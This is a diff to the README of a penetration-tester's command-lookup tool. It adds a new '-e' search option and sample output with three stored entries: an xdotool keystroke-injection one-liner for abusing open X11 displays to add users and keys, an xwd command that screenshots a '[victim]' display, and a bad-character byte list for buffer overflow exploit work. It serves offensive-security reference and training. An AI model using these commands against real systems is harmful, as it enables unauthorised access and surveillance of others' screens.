@@ -5,9 +5,11 @@ I would recommend picking up a copy of the book from Amazon, it is pretty handy 
 
 # Quick Start
 ```
+Download, Update, Look for something!
  $ chmod +x rtfm.py
  $ ./rtfm.py -u
- $ ./rtfm.py -c 'rtfm'
+ $ ./rtfm.py -e 'Something'
+
 ```
 
 # Usage 
@@ -19,6 +21,7 @@ For when you just cant remember the syntax,  you should just RTFM
 
 Options:
   --version             show program's version number and exit
+  -e SA, --everything=SA
   -h, --help            show this help message and exit
   --delete=DELETE       Delete specified ID
   -t TAG, --tag=TAG     Specify one or more tags to look for (a, b, c)
@@ -49,8 +52,57 @@ Example: rtfm.py -c rtfm -t linux -R help -r git -pP -d
 Its pretty much a simple search program, nothing to fancy, examples include:
 
 # Searching the DB
-Searching the DB is handled through the following switches: t, c, R, r, a and, A:
+Searching the DB is handled through the following switches: e, t, c, R, r, a and, A. When you are just browsing for a command, you will want to use e:
 
+```
+$ ./rtfm.py -e x11 -pP
++----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Added By Innes | Cmd ID : 82                                                                                                                                                                         |
++----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Command        | command="[cmd]";echo -n xdotool key " "; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed |
+|                | 's#>#greater#g'| sed 's#+#plus#g' | sed 's#"#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter                                     |
+|                |                                                                                                                                                                                     |
+| Comment        | Abuse open x11 : Think open term add user add key ;)                                                                                                                                |
+| Tags           | linux                                                                                                                                                                               |
+|                | bash                                                                                                                                                                                |
+|                | interesting                                                                                                                                                                         |
+| Date added     | 2018-02-11                                                                                                                                                                          |
+| References     | https://necurity.co.uk                                                                                                                                                              |
+|                | https://ubuntuforums.org/archive/index.php/t-1970619.html                                                                                                                           |
++----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
++----------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Added By Innes | Cmd ID : 272                                                                                                                                                          |
++----------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Command        | xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg |
+|                |                                                                                                                                                                       |
+| Comment        | take a screenshot from a open X11 and convert it to a jpg                                                                                                             |
+| Tags           | linux                                                                                                                                                                 |
+|                | bash                                                                                                                                                                  |
+|                | scanning                                                                                                                                                              |
+|                | pivoting                                                                                                                                                              |
+| Date added     | 2018-02-11                                                                                                                                                            |
+| References     | http://unix.stackexchange.com/questions/44821/how-do-i-screencap-another-xorg-display                                                                                 |
++----------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
++----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Added By Innes | Cmd ID : 481                                                                                                                                                                                   |
++----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Command        | "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\ |
+|                | x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5 |
+|                | f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\ |
+|                | x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xb |
+|                | e\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\ |
+|                | xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"                                                                                                                       |
+|                |                                                                                                                                                                                                |
+| Comment        | Bad Char's block, re-send removing bad ones                                                                                                                                                    |
+| Tags           | buffer overflow                                                                                                                                                                                |
+| Date added     | 2018-02-11                                                                                                                                                                                     |
+| References     | https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/                                                                                      |
+|                | https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars                                                                                                           |
++----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+                                                                    
+```
+
+Any other time, one of t'other flags for other things;
 
 -c is search for a command. Use this when you know what command you want to look for, but can't quite remember the syntax. For example, if you want to quickly look up the syntax for a common sqlmap command. Useful for jumping straight to collections of common flags or one liners:
 ```
